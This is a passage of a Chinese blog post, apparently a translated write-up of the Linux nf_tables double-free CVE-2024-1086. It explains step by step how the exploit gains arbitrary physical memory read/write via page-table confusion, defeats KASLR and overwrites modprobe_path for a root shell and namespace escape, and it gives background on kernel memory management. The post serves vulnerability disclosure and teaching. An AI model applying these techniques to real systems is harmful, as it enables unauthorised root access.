<h2 id="1-2-工作流程"><a href="#1-2-工作流程" class="headerlink" title="1.2 工作流程"></a>1.2 工作流程</h2><p>为了触发导致双重释放的 bug，我在非特权用户命名空间中添加了一个 Netfilter 规则。该 Netfilter 规则包含一个设置恶意判决值的表达式，这会使内核内部的 <code>nf_tables</code> 代码首先解释为 <code>NF_DROP</code>，接着释放 skb，然后返回 <code>NF_ACCEPT</code>，以便继续数据包处理，导致 skb 被双重释放。然后，我通过分配一个 16 页的 IP 数据包（以便它由 <code>buddy-allocator</code> 分配，而不是 <code>PCP-allocator</code> 或 <code>slab-allocator</code>，并且在不同 CPU 之间共享缓存）来触发此规则。</p>
<p>为了延迟第二次释放（以避免数据损坏），我滥用了 IP 数据包的 IP 片段逻辑。这使得我们能够让 skb 在 IP 片段队列中“等待”任意时间而不被释放。为了遍历包含损坏的数据包元数据的代码路径，我伪造了 IP 源地址 <code>1.1.1.1</code> 和目标地址 <code>255.255.255.255</code>。然而，这意味着我们需要处理反向路径转发（RPF），因此我们需要在网络命名空间中禁用它（不需要 root 权限）。</p>
<p>为了实现对任何物理内存地址（包括内核地址）的无限读写，我提出了 Dirty Pagedirectory 技术。简单来说，这种技术是页表混淆，通过将一个 PTE 页和 PMD 页分配给同一个物理页来实现。</p>
<p>由于页表页面是通过调用 <code>alloc_pages()</code> 分配的 <code>migratetype==0</code> 且 <code>order==0</code> 的页面，而 skb 头（双重释放的对象）是通过 <code>kmalloc()</code> 分配的，因此意味着使用了 <code>slab-allocator</code> 进行页级别为 <code>order&lt;=1</code> 的分配，使用 <code>PCP-allocator</code> 进行页级别为 <code>order&lt;=3</code> 的分配，而使用 <code>buddy-allocator</code> 进行页级别为 <code>order&gt;=4</code> 的分配。为了避免麻烦（在博客中详细解释），我们必须使用 <code>order&gt;=4</code> 的页面进行双重释放。这也意味着我们不能直接在 <code>buddy-allocator</code> 页面（<code>order&gt;=4</code>）上进行双重分配 PTE&#x2F;PMD 页（<code>order==0</code>），但我发现了一些方法来实现这一点。</p>
<p>为了使用基于 <code>kmalloc</code> 的双重释放来双重分配 PTE&#x2F;PMD 页面，我提出了两种方法：</p>
<ul>
<li><p><strong>更优的页面转换技术（PCP 清空）</strong>：<br>在这种更简单、更稳定、更快速的方法中，我们利用了这样一个事实，即 PCP 分配器只是一种每个 CPU 的自由列表，当它被耗尽时，会从 <code>buddy-allocator</code> 中重新填充页面。因此，我们只需将 <code>order==4</code>（16 页）的页面释放到 <code>buddy-allocator</code> 自由列表中，排空 PCP 列表，然后用 <code>buddy-allocator</code> 自由列表中的 64 个页面重新填充 <code>order==0</code> 的 PCP 列表，其中包含这些 16 个页面。</p>
</li>
<li><p><strong>原始页面转换技术（竞态条件）</strong>：<br>这种方法依赖于竞态条件，因此只在虚拟化环境（如 QEMU 虚拟机）中有效，在这种环境中，终端 IO 会导致虚拟机内核产生明显延迟。我们利用了 WARN() 消息引发的约 50-300 毫秒的延迟来触发竞态条件，将一个 <code>order==4</code> 的 <code>buddy</code> 页面释放到 <code>order==0</code> 的 PCP 自由列表中。正如你可能注意到的，这在真实硬件上不起作用（延迟约为 1 毫秒），因此被替换为上述方法。不幸的是，我在最初的 KernelCTF 漏洞利用中使用了这种方法。</p>
</li>
</ul>
<p>在双重释放之间，我确保页面引用计数不会降到 0，因为这会导致页面无法释放（可能是作为一种双重释放的缓解措施）。此外，我在相同 CPU 的 <code>skbuff_head_cache</code> slab 缓存中喷洒 <code>skb</code> 对象，以避免 KernelCTF 缓解实例中的实验性自由列表损坏检测，并提高整体稳定性。</p>
<p>当获得双重释放原语后，我将使用一种称为 Dirty Pagedirectory 的新技术，实现对任意物理地址的无限读写。这需要将一个页面表项（PTE）页面和一个页面中间目录（PMD）页面双重分配到同一个地址。当向 PTE 页面范围内的页面写入一个包含页面权限和物理地址的任意 PTE 值时，PMD 页面在尝试解引用 PTE 值的页面时，会将该地址解释为 PMD 页面范围内的地址。简而言之，就是从用户态将 PTE 值设置为 <code>0xDEADBEEF</code>，然后再次从用户态解引用该 PTE 值，以使用 <code>0xDEADBEEF</code> 中设置的标志（包括但不限于权限）访问由 <code>0xDEADBEEF</code> 引用的页面。</p>
<p>为了利用这种无限 R&#x2F;W 的原语，我们需要刷新 TLB。在阅读了几篇不太实用的研究论文后，我想出了自己的复杂刷新算法，从用户态刷新 Linux 中的 TLB：调用 <code>fork()</code> 和 <code>munmap()</code> 清除 VMA。为了避免在子线程退出程序时发生崩溃，我使子线程无限期休眠。</p>
<p>我利用这种无限的物理内存访问暴力破解物理 KASLR（这之所以被加速，是因为物理内核基地址与 <code>CONFIG_PHYSICAL_START</code>（例如 <code>0x100&#39;0000 / 16MiB</code>）或（当定义时）<code>CONFIG_PHYSICAL_ALIGN</code>（例如 <code>0x20&#39;0000 / 2MiB</code>）对齐），并通过检查 8GiB 内存机器上的 2MiB 页找到物理内核基地址（假设 16MiB 对齐），这甚至可以适应覆盖的单个 PTE 页面区域。为了检测内核，我使用了生成文件高度精确指纹的 <code>get-sig</code> 脚本，将其集成到我的漏洞利用中。</p>
<p>为了找到 <code>modprobe_path</code>，我对内核基地址之后的 80MiB 进行了简单的 “&#x2F;sbin&#x2F;modprobe” + “\x00” * … 的内存扫描，以获得对 <code>modprobe_path</code> 的访问。为了验证找到的是“真实的” <code>modprobe_path</code> 变量，而不是假阳性，我覆盖 <code>modprobe_path</code>，并检查 <code>/proc/sys/kernel/modprobe</code>（<code>modprobe_path</code> 的只读用户界面）是否反映了这个更改。如果启用了 <code>CONFIG_STATIC_USERMODEHELPER</code>，它只会检查 “&#x2F;sbin&#x2F;usermode-helper”。</p>
<p>为了提权并打开 root shell（包括命名空间逃逸），我将 <code>modprobe_path</code> 或 “&#x2F;sbin&#x2F;usermode-helper” 重写为漏洞利用的 <code>memfd</code> 文件描述符，包含提权脚本，例如 <code>/proc/&lt;pid&gt;/fd/&lt;fd&gt;</code>。这种无文件的方法使得可以在完全只读的文件系统上运行漏洞利用（通过 Perl 引导）。如果漏洞利用在命名空间中运行，则需要暴力破解 PID，因为漏洞利用只知道命名空间的 PID，但幸运的是速度非常快，因为我们不需要刷新 TLB，因为我们没有改变 PTE 的物理地址。基本上，这就是将字符串写入用户态地址并执行文件。</p>
<p>在提权脚本中，我们将执行 <code>/bin/sh</code> 进程（作为 root）并将漏洞利用的文件描述符（<code>/dev/&lt;pid&gt;/fd/&lt;fd&gt;</code>）挂接到 shell 的文件描述符上，允许我们实现命名空间逃逸。这种方法的优势在于它非常通用，因为它适用于本地终端和反向 shell，完全不依赖文件系统和其他形式的隔离。</p>
<h1 id="2-背景信息"><a href="#2-背景信息" class="headerlink" title="2. 背景信息"></a>2. 背景信息</h1><h2 id="2-1-nf-tables"><a href="#2-1-nf-tables" class="headerlink" title="2.1. nf_tables"></a>2.1. nf_tables</h2><p><code>nf_tables</code> 是 Linux 内核中的一个内置模块。在最新版本的 <code>iptables</code>（这是目前最受欢迎的防火墙工具之一）中，<code>nf_tables</code> 模块作为后端。<code>iptables</code> 本身是 <code>ufw</code> 后端的一部分。为了决定哪些数据包可以通过防火墙，<code>nftables</code> 使用了一个包含用户定义规则的状态机。</p>
<h3 id="2-1-1-Netfilter-层次结构"><a href="#2-1-1-Netfilter-层次结构" class="headerlink" title="2.1.1. Netfilter 层次结构"></a>2.1.1. Netfilter 层次结构</h3><p>这些规则有以下顺序（例如，一个表包含多个链，一个链包含多条规则，一条规则包含多个表达式）：</p>
<ul>
<li><strong>表（Tables）</strong>（针对协议）</li>
<li><strong>链（Chains）</strong>（触发条件）</li>
<li><strong>规则（Rules）</strong>（状态机函数）</li>
<li><strong>表达式（Expressions）</strong>（状态机指令）</li>
</ul>
<p><strong>图 2.1.1.1：nftables 的表、链、规则和表达式的层次概览。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/nf_tables-4.svg"
                     
                ></p>
<p>这种结构使用户可以编写复杂的防火墙规则，因为 <code>nftables</code> 有许多可以串联在规则中用于过滤数据包的原子表达式。此外，它允许链在数据包处理代码的不同时间点运行（例如路由之前和路由之后），这些时间点可以在创建链时通过标志选择，如 <code>NF_INET_LOCAL_IN</code> 和 <code>NF_INET_POST_ROUTING</code>。由于其极高的可定制性，<code>nftables</code> 以非常不安全而闻名。因此，已经报告并修复了许多漏洞。</p>
<p>想了解更多关于 <code>nftables</code> 的信息，推荐阅读 @pqlqpql 的这篇博客文章：《How The Tables Have Turned: An analysis of two new Linux vulnerabilities in nf_tables》。</p>
<h3 id="2-1-2-Netfilter-判决（Verdicts）"><a href="#2-1-2-Netfilter-判决（Verdicts）" class="headerlink" title="2.1.2. Netfilter 判决（Verdicts）"></a>2.1.2. Netfilter 判决（Verdicts）</h3><p>更与本文相关的是 Netfilter 的判决。判决是 Netfilter 规则集对某个试图通过防火墙的数据包做出的决定。例如，可以是丢弃或者接受。如果规则决定丢弃数据包，Netfilter 将停止处理数据包。相反，如果规则决定接受数据包，Netfilter 将继续处理数据包，直到数据包通过所有规则。当前所有的判决包括：</p>
<ul>
<li><strong>NF_DROP</strong>: 丢弃数据包，停止处理。</li>
<li><strong>NF_ACCEPT</strong>: 接受数据包，继续处理。</li>
<li><strong>NF_STOLEN</strong>: 停止处理，需要钩子来释放数据包。</li>
<li><strong>NF_QUEUE</strong>: 让用户态应用程序处理数据包。</li>
<li><strong>NF_REPEAT</strong>: 再次调用钩子。</li>
<li><strong>NF_STOP（已弃用）</strong>: 接受数据包，停止 Netfilter 中的处理。</li>
</ul>
<h2 id="2-2-sk-buff-skb"><a href="#2-2-sk-buff-skb" class="headerlink" title="2.2. sk_buff (skb)"></a>2.2. sk_buff (skb)</h2><p>为了描述网络数据（包括 IP 数据包、以太网帧、WiFi 帧等），Linux 内核使用了 <code>sk_buff</code> 结构，并通常称它们为 <code>skb</code> 作为缩写。为了表示一个数据包，内核使用了两个对我们很重要的对象：<code>sk_buff</code> 对象本身，包含 <code>skb</code> 的处理元数据，以及 <code>sk_buff-&gt;head</code> 对象，包含实际的数据包内容，比如 IP 头和 IP 数据包的主体。</p>
<p><strong>图 2.2.1：<code>sk_buff</code> 结构的数据缓冲区及其长度字段概览。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/sk_buff_struct-4.svg"
                     
                ></p>
<p>为了使用 IP 头中的值（因为 IP 数据包会在内核中解析），内核使用 <code>ip_hdr()</code> 函数对 IP 头结构和 <code>sk_buff-&gt;head</code> 对象进行类型重解（type punning）。这种模式在内核中被广泛应用，因为它允许快速解析头部信息。实际上，这种类型重解的技巧在执行二进制文件时也用于解析 ELF 头部。</p>
<p>要了解更多，可以查看 Linux 内核文档中的这一页：<a class="link"   target="_blank" rel="noopener" href="https://docs.kernel.org/networking/skbuff.html" >《struct sk_buff - The Linux Kernel》<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<h2 id="2-3-IP-数据包分片"><a href="#2-3-IP-数据包分片" class="headerlink" title="2.3. IP 数据包分片"></a>2.3. IP 数据包分片</h2><p>IPv4 的一个功能是数据包分片。分片允许数据包以多个 IP 分片的形式传输。分片本质上是常规 IP 数据包，除了它们不包含 IP 头中指定的完整数据包大小，并且在头部中设置了 <code>IP_MF</code> 标志。</p>
<p>IP 分片头中 IP 数据包长度的计算公式为：<code>iph-&gt;len = sizeof(struct ip_header) * frags_n + total_body_length</code>。在 Linux 内核中，单个 IP 数据包的所有分片都会存储到同一个红黑树（称为 IP 分片队列）中，直到所有分片都接收完毕。为了在重新组装时过滤出每个分片应该放置的位置，需要使用 IP 分片偏移量：<code>iph-&gt;offset = body_offset &gt;&gt; 3</code>，其中 <code>body_offset</code> 是最终 IP 主体中的偏移量，不包括计算 <code>iph-&gt;len</code> 时可能使用的任何 IP 头长度。如你所见，分片数据必须以 8 字节对齐，因为规格规定偏移量字段的高 3 位用于标志（如 <code>IP_MF</code> 和 <code>IP_DF</code>）。如果我们想把 64 字节的数据通过 2 个大小分别为 8 字节和 56 字节的分片传输，应该像下面的代码那样格式化。内核随后会将 IP 数据包重新组装为 <code>&#39;A&#39; * 64</code>。</p>
<p><strong>代码块 2.3.1：描述 IP 分片头格式的 C 伪代码。</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">iph1-&gt;len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ip_header)*<span class="number">2</span> + <span class="number">64</span>;</span><br><span class="line">iph1-&gt;offset = ntohs(<span class="number">0</span> | IP_MF); <span class="comment">// 设置 MORE FRAGMENTS 标志 </span></span><br><span class="line"><span class="built_in">memset</span>(iph1_body, <span class="string">&#x27;A&#x27;</span>, <span class="number">8</span>); </span><br><span class="line">transmit(iph1, iph1_body, <span class="number">8</span>); </span><br><span class="line"></span><br><span class="line">iph2-&gt;len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ip_header)*<span class="number">2</span> + <span class="number">64</span>; </span><br><span class="line">iph2-&gt;offset = ntohs(<span class="number">8</span> &gt;&gt; <span class="number">3</span>); <span class="comment">// 不设置 IP_MF，因为这是最后一个分片 </span></span><br><span class="line"><span class="built_in">memset</span>(iph2_body, <span class="string">&#x27;A&#x27;</span>, <span class="number">56</span>); </span><br><span class="line">transmit(iph2, iph2_body, <span class="number">56</span>);</span><br></pre></td></tr></table></figure></div>
<p>要了解更多关于数据包分片的信息，可以阅读 PacketPushers 的这篇博客文章：<a class="link"   target="_blank" rel="noopener" href="https://packetpushers.net/ip-fragmentation-in-detail/" >《IP Fragmentation in Detail》<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<h2 id="2-4-页分配"><a href="#2-4-页分配" class="headerlink" title="2.4. 页分配"></a>2.4. 页分配</h2><p>Linux 内核中有三种主要的页分配方式：使用 slab 分配器、伙伴分配器（buddy allocator）和每 CPU 页（PCP）分配器。简而言之：伙伴分配器通过调用 <code>alloc_pages()</code> 分配页面，可以用于任意页的大小（0-&gt;10），并从跨 CPU 的全局页池中分配页面。PCP 分配器也通过调用 <code>alloc_pages()</code> 分配页面，主要用于从每 CPU 页池中分配大小为 0-&gt;3 的页面。此外，还有 slab 分配器，通过 <code>kmalloc()</code> 调用，可以从每 CPU 的专用空闲列表&#x2F;缓存中分配 0-&gt;1 大小的页面（包括更小的分配）。</p>
<p>PCP 分配器的存在是因为当 CPU 正在从全局池分配页面时，伙伴分配器会锁定访问，因此当另一个 CPU 也要分配页面时会被阻塞。PCP 分配器通过在后台由伙伴分配器批量分配较小的每 CPU 页池来避免这一问题。这样，页分配阻塞的几率就会更小。</p>
<p><strong>图 2.4.1：每种页分配器在不同页大小下的概览。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/pageallocatorbailywick.svg"
                     
                ></p>
<p><strong>图 2.4.2：从 <code>kmalloc()</code> 开始的页分配过程活动图。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/pageallocations-3.svg"
                     
                ></p>
<p>要了解更多关于伙伴分配器和 PCP 分配器的信息，请查看这篇详细分析中的页分配部分：<a class="link"   target="_blank" rel="noopener" href="https://gitlab.com/gitlab-com/gl-infra/scalability/-/issues/2387#user-content-page-allocator" >《Reference: Analyzing Linux kernel memory management anomalies》<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<h2 id="2-5-物理内存"><a href="#2-5-物理内存" class="headerlink" title="2.5. 物理内存"></a>2.5. 物理内存</h2><h3 id="2-5-1-物理到虚拟内存映射"><a href="#2-5-1-物理到虚拟内存映射" class="headerlink" title="2.5.1. 物理到虚拟内存映射"></a>2.5.1. 物理到虚拟内存映射</h3><p>内核的一个最基本的元素就是内存管理。当我们谈论内存时，可以分为两种类型：物理内存和虚拟内存。物理内存是 RAM 芯片使用的内存，而虚拟内存则是 CPU 上运行的程序（包括内核）与物理内存交互的方式。当然，当我们使用 <code>gdb</code> 调试二进制程序时，我们使用的所有地址都是虚拟地址，因为 <code>gdb</code> 和底层程序都是这样运行的。</p>
<p>本质上，虚拟内存建立在物理内存之上。这种模型的好处是虚拟地址范围比物理地址范围大，因为未使用的虚拟内存页可以取消映射，这对 ASLR 效率非常有利。此外，我们还可以将一个物理页面映射到多个虚拟页面上，或者让系统看起来好像有 128TiB 的地址，而实际上大部分并没有实际页面支持。</p>
<p>这意味着我们可以在只有 4GiB 物理内存的系统上，每个进程使用 128TiB 的虚拟内存范围。理论上，我们甚至可以将一个大小为 4096 字节的物理页面映射到所有 128TiB 的用户空间虚拟页面上。当一个程序想向虚拟页面写入一个 <code>\x42</code> 字节时，我们执行写时复制（COW），创建第二个物理页面，并将该页面映射到程序写入的那个虚拟页面。</p>
<p><strong>图 2.5.1.1：虚拟内存页与物理内存页之间的映射关系。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/phys_virt_mem-1.svg"
                     
                ></p>
<p>为了将虚拟内存地址转换为物理内存地址，CPU 使用页表。因此，当用户态程序尝试读取（虚拟内存）地址 <code>0xDEADBEEF</code> 时，CPU 实际上会执行 <code>mov rax, [0xDEADBEEF]</code>。然而，为了真正从 RAM 芯片中读取值，CPU 需要将虚拟内存地址 <code>0xDEADBEEF</code> 转换为物理内存地址。</p>
<p>这种转换对内核和用户态程序是透明的。当用户态程序试图访问虚拟内存地址时，CPU 会在 MMU 中的 TLB（转换后备缓冲）中查找，这个 TLB 缓存了虚拟到物理地址的转换。如果虚拟地址 <code>0xDEADBEEF</code>（更确切地说是虚拟页面 <code>0xDEADB000</code>）最近被访问过，那么 TLB 就不需要遍历页表（将在下一小节中详细说明），因为物理地址已经被缓存了。如果地址不在 TLB 缓存中，TLB 需要遍历页表以获取物理地址。</p>
<p>要了解更多关于物理内存的信息，可以查看哈佛大学操作系统课程的这篇优秀的内存布局页面。</p>
<h3 id="2-5-2-页表"><a href="#2-5-2-页表" class="headerlink" title="2.5.2. 页表"></a>2.5.2. 页表</h3><p>当 TLB 被请求查找虚拟地址对应的物理地址且该地址不在其缓存中时，TLB 会执行 “页遍历” 来获取虚拟地址的物理地址。页遍历意味着遍历页表，这些页表是几个嵌套数组，其中最底层的数组中存储了物理地址。</p>
<blockquote>
<p>请注意，下面的示意图使用了 9 位的页表索引（因为 <code>2**9 = 512</code> 个页表值可以装入一个页面中）。此外，我们在这里使用的是 4 级页表，但内核还支持 5 级、3 级等页表。</p>
</blockquote>
<p><strong>图 2.5.2.1：虚拟地址到物理地址转换的示例。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/pagetables_with_bits-1.webp"
                     
                ></p>
<blockquote>
<p>这种嵌套数组的模型可以节省大量内存。与其为 128TiB 的虚拟地址分配一个巨大的数组，不如将其划分为多个较小的数组，每一层管理的范围更小。这意味着负责未分配区域的表不必被分配。</p>
</blockquote>
<p>遍历页表的过程非常便宜，因为它基本上是 4-5 次数组解引用。这些解引用的索引——你准备好被惊艳了吗——嵌入在虚拟地址中。这意味着虚拟地址不是一个地址，而是包含了页表索引和前缀规范。这种优雅的方法允许在 O(1) 时间内获取物理地址，因为数组解引用是 O(1) 的，恢复索引的位移也是 O(1) 的。然而，由于页表需要经常被遍历，即使是这些数组解引用的速度也会变慢。因此，引入了 TLB。</p>
<p>在实际操作中，TLB 需要找到物理内存中的页表以进行页遍历。运行进程的用户态页表层次结构（PGD）的根地址存储在相应 CPU 核心的特权 CR3 寄存器中。”特权” 意味着该寄存器只能从内核空间访问，因为用户态访问会导致权限错误。当内核调度程序使 CPU 切换到另一个进程上下文时，内核会将 CR3 寄存器设置为 <code>virt_to_phys(current-&gt;mm-&gt;pgd)</code>。</p>
<p>要了解更多关于 MMU 如何找到页表层次结构位置以执行 TLB 查找时的页面缺失处理，可以查看<a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Control_register" >维基百科关于控制寄存器的页面<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<h2 id="2-6-TLB-刷新"><a href="#2-6-TLB-刷新" class="headerlink" title="2.6. TLB 刷新"></a>2.6. TLB 刷新</h2><p>TLB 刷新是指，顾名思义，刷新 TLB。TLB（转换后备缓冲）缓存了虚拟地址和物理地址之间的转换。这种做法大大提高了性能，因为 CPU 不必再遍历页表，而是可以直接查找 TLB。</p>
<p>当虚拟地址的页表层次结构在内核空间中发生变化时，也需要在 TLB 中更新。这是通过在页表发生更改的函数中调用内核函数手动实现的。这些函数会“刷新”TLB，即清空 TLB 的转换缓存（可能仅针对某个地址范围）。然后，下次访问该虚拟地址时，TLB 会将转换结果保存到 TLB 缓存中。</p>
<p>然而，有时候我们在利用漏洞时会更改页表（及其虚拟地址），这种情况并不在预期之中。例如，使用一个 UAF 写入漏洞覆盖 PTE。这时，内核中的 TLB 刷新函数并不会被调用，因为我们并没有使用函数来更改页表，而那些函数确实会调用 TLB 刷新函数。因此，我们需要从用户态间接地刷新 TLB。否则，TLB 中会包含过时的缓存项。在本文的技术部分，我将展示一种自己设计的解决方法。</p>
<p>要了解更多关于 TLB 的信息，可以查看维基百科文章：<a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Translation_lookaside_buffer" >《Translation lookaside buffer - Wikipedia》<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<h2 id="2-7-Dirty-Pagetable"><a href="#2-7-Dirty-Pagetable" class="headerlink" title="2.7. Dirty Pagetable"></a>2.7. Dirty Pagetable</h2><p><code>Dirty Pagetable</code> 是由 N. Wu 提出的一种新技术，核心在于通过覆盖 PTE 以进行 KSMA（内核空间内存镜像攻击）。他们的研究论文提出了两种覆盖 PTE 的场景：一个是双重释放漏洞，另一个是 UAF 写入漏洞。两种场景都配有实用示例。原始论文非常值得一读，因为我从中学到了很多。</p>
<p><strong>图 2.7.1：<code>Dirty Pagetable</code> 技术的高级概述。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/dirtypagetable-3.svg"
                     
                ></p>
<p>然而，原始论文中有一些关键话题没有涉及，我试图在本文中加以讨论。例如页表的工作方式、TLB 刷新、概念验证代码、物理 KASLR 的工作原理以及 PTE 值的格式。此外，我还在本文中介绍了一种该技术的变体（Dirty Pagedirectory）。</p>
<p>要了解更多，请参阅 N. Wu 的原始研究论文：<a class="link"   target="_blank" rel="noopener" href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html" >《Dirty Pagetable: A Novel Exploitation Technique To Rule Linux Kernel》<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<h2 id="2-8-覆盖-modprobe-path"><a href="#2-8-覆盖-modprobe-path" class="headerlink" title="2.8. 覆盖 modprobe_path"></a>2.8. 覆盖 modprobe_path</h2><p>一种经典的提权技术是覆盖内核中的 <code>modprobe_path</code> 变量。该变量的值在编译时设置为 <code>CONFIG_MODPROBE_PATH</code>，并使用空字节填充至 <code>KMOD_PATH_LEN</code> 长度。通常情况下，<code>CONFIG_MODPROBE_PATH</code> 被设置为 <code>/sbin/modprobe</code>，因为这是 modprobe 二进制文件的常见路径。</p>
<p>当用户尝试执行一个具有未知魔数字节头的二进制文件时，使用该变量。例如，ELF 二进制文件的魔数字节为 <code>FE45 4C46</code>（即 <code>.ELF</code>）。执行二进制文件时，内核会查找与这些魔数字节匹配的已注册二进制文件处理程序。在 ELF 的情况下，会选择 ELF <code>binfmt</code> 处理程序。然而，当找不到匹配的 binfmt 时，内核会使用 <code>modprobe_path</code> 中存储的路径调用 <code>modprobe</code>，并查询名为 <code>binfmt-%04x</code> 的内核模块，其中 <code>%04x</code> 是文件的前两个字节的十六进制表示。</p>
<p><strong>图 2.8.1：<code>modprobe_path</code> 提权技术的分析。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/modprobe_path-4.svg"
                     
                ></p>
<p>为了利用这一点，我们可以将 <code>modprobe_path</code> 的值覆盖为提权脚本的路径（例如赋予 <code>/bin/sh</code> root SUID 权限），然后通过尝试执行一个无效格式的文件（如 <code>ffff ffff</code>）来调用 <code>modprobe</code>。内核将以 root 权限运行 <code>/tmp/privesc_script.sh -q -- binfmt-ffff</code>，这样我们就可以以 root 权限运行任何代码。这使得我们不必自己运行内核函数，而是可以通过覆盖一个字符串轻松提权。</p>
<p>在某个时间点，<code>CONFIG_STATIC_USERMODEHELPER_PATH</code> 缓解措施被引入，使得覆盖 <code>modprobe_path</code> 变得无用。该缓解措施通过将每个被执行二进制文件的路径设置为类似于 <code>busybox</code> 的二进制文件来工作，而该二进制文件的行为取决于传递的 <code>argv[0]</code> 文件名。因此，即使我们覆盖了 <code>modprobe_path</code>，也只有 <code>argv[0]</code> 的值发生了变化，<code>busybox</code> 类似的二进制文件无法识别这个值，因此不会执行。</p>
<p>本文展示的漏洞利用可以在有无 <code>CONFIG_STATIC_USERMODEHELPER_PATH</code> 的情况下都正常工作，因为我们可以简单地覆盖内核内存中只读的 <code>&quot;/sbin/usermode-helper&quot;</code> 字符串。</p>
<p>要了解更多关于 <code>modprobe_path</code> 技术的信息，可以查看 Github 上用户 Smallkirby 的这篇页面：<a class="link"   target="_blank" rel="noopener" href="https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md" >《modprobe_path.md · smallkirby&#x2F;kernelpwn》<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<h2 id="2-9-KernelCTF"><a href="#2-9-KernelCTF" class="headerlink" title="2.9. KernelCTF"></a>2.9. KernelCTF</h2><p>KernelCTF 是由 Google 运行的一个项目，旨在披露针对（加固）Linux 内核的新利用技术。它也是为 Linux 内核中的任何漏洞获得道德赏金的一个好方法，因为赏金金额从 $21.337 到 $111.337 甚至更多，这取决于漏洞的范围以及是否有新颖的利用技术。</p>
<p>KernelCTF 的主要概述是有三个机器类别：LTS（长期稳定内核，具有现有的缓解措施）、Mitigation（在现有缓解措施基础上加固的内核）和 COS（优化容器的操作系统）。每个机器版本只能被“攻击”一次，首先成功的研究人员将获得奖励。这意味着如果研究员 A 成功攻破了 LTS 版本 6.1.63，那么研究员 A 和研究员 B 仍然可以攻破 Mitigation 版本 6.1.63。在 KernelCTF 平台上发布下一个版本（通常是两周后）后，研究员 A 和研究员 B 可以再次尝试攻破 LTS 版本 6.1.65。然而，研究员 A 针对 6.1.63 版本报告的漏洞很可能已被修复，因此如果再次尝试利用它，会被视为重复。</p>
<p>要“攻破” KernelCTF 机器，研究人员需要读取根（jail 宿主）命名空间中的 <code>/flag</code> 文件，该文件只有 root 用户可以读取。正如你所预料的，这通常需要同时进行命名空间沙箱（nsjail）逃逸以及提权到 root 用户。最终目标是只要捕获了 flag，过程如何并不重要。</p>
<p>要调试环境，可以查看 KernelCTF 团队提供的 <code>local_runner.sh</code> 脚本。注意其中的 <code>--root</code> 参数，它允许你在 jail 外部运行 root shell。</p>
<p>要了解更多关于 KernelCTF 项目的信息，请查看这个页面：<a class="link"   target="_blank" rel="noopener" href="https://google.github.io/security-research/kernelctf/rules.html" >“KernelCTF rules | security-research”<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<h1 id="3-漏洞"><a href="#3-漏洞" class="headerlink" title="3. 漏洞"></a>3. 漏洞</h1><h2 id="3-1-发现漏洞"><a href="#3-1-发现漏洞" class="headerlink" title="3.1. 发现漏洞"></a>3.1. 发现漏洞</h2><p>一切始于我想要在 ORB rootkit Netkit 中实现防火墙绕过。我想依赖于内核 API（导出函数）来执行所有操作，因为这样可以获得与常规内核模块相同的兼容性。希望这意味着 rootkit 内核模块可以跨架构和内核版本使用，而无需更改源代码。</p>
<p>这将我引向了一个名为 Netfilter 的“兔子洞”。在这项研究之前，我对 Netfilter 没有任何实际经验，所以我不得不自己做大量研究。幸运的是，来自内核开发人员和信息安全社区的大量文档对我非常有帮助。在阅读子系统的文档后，我从上至下阅读了与 nf_tables 规则和表达式相关的源代码。</p>
<p>在阅读 nf_tables 代码时——它的状态机从软件开发的角度来看非常有趣——我注意到了 <code>nf_hook_slow()</code> 函数。这个函数遍历链中的所有规则，当发出 <code>NF_DROP</code> 时，它会立即停止评估并返回。</p>
<p>在处理 <code>NF_DROP</code> 时，它释放了数据包，并允许用户使用 <code>NF_GET_DROPERR()</code> 设置返回值。有了这个知识，我使函数在处理 <code>NF_DROP</code> 时返回 <code>NF_ACCEPT</code>。经过多次内核崩溃和代码路径分析后，我找到了一个双重释放漏洞。</p>
<p>代码段 3.1.1：<code>nf_hook_slow()</code> 内核函数，遍历 nftables 规则。</p>
